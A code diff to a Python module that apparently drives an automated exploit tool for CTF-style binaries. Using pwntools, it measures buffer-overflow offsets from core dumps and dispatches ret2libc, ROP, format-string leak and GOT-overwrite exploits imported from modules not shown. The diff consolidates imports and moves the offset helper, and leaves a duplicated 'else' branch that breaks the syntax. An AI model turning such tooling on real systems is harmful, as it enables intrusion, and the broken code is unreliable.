@@ -3,35 +3,17 @@ Determines which exploits to call
 """
 
 import re
-import os
-from pwn import ELF, process, ROP, cyclic, cyclic_find
+from pwn import ELF, process, ROP
 from typing import List, Union
 
 from vulnerabilities import FormatString, StackOverflow, get_format_string_vulns, get_stack_overflow_vulns
-# Imports exploits for StackOverflows
-from exploits import ret2win, ret2system, ret2execve, ret2syscall, ret2libc, ropwrite
-# Imports exploits for FormatStrings
-from exploits import stack_leak, libc_leak, write_prim, got_overwrite
 from exploits import ret2win, ret2system, ret2execve, ret2syscall, ret2libc, ropwrite, stack_leak, write_prim, got_overwrite, libc_leak
+from config import *
+# Unsure if needed still to get offsets in this module
+from vulnerabilities.StackOverflow import get_overflow_size
 
-pointer_re = r"""0x[0-9a-f]*"""
 
-
-def get_overflow_size(binary, register='rsp', size_of_input=5000) -> int:
-    """
-    Returns -1 if nothing is found in the core file for the given register.
-    Modify size_of_input to try larger/smaller buffer.
-    Register defaults to rsp but function can be used for any.
-    """
-    p = process(binary)
-    p.sendline(cyclic(size_of_input, n=8))
-    p.wait()
-    # Unsure why solarpanth3r.py uses a try for the corefile.
-    # A corefile is made as soon as process is called with a valid binary.
-    core = p.corefile
-    offset = cyclic_find(core.read(core.registers[register], 8), n=8)
-    os.remove(core.file.name)
-    return offset
+# pointer_re = r"""0x[0-9a-f]*"""
 
 
 def end_prog(flag: str) -> None:
@@ -51,7 +33,7 @@ def dispatch_exploits(file_path: str) -> None:
     rbp_offset = get_overflow_size(file_path, 'rbp')
     rip_offset = get_overflow_size(file_path, 'rip')
 
-    # Get all vulnerabilites
+    # Get all vulnerabilities
     vulns: List[Union[FormatString, StackOverflow]] = get_format_string_vulns(file_path) + get_stack_overflow_vulns(file_path)
 
     for vuln in vulns:
@@ -116,16 +98,15 @@ def dispatch_exploits(file_path: str) -> None:
                     
             elif vuln_printfs in syms and True:
                 flag = None
-                libc = ELF(c.libc_path)
-                r = ROP(libc)
-            else:
-                pass
+                libc = ELF(libc_path)
+                r = ROP([libc])
 
             else:
                 pass  # TODO
                 
         else:
             pass  # TODO
+        
     for vuln1 in vulns:
         for vuln2 in vulns:
             if isinstance(vuln1, FormatString) and isinstance(vuln2, StackOverflow):
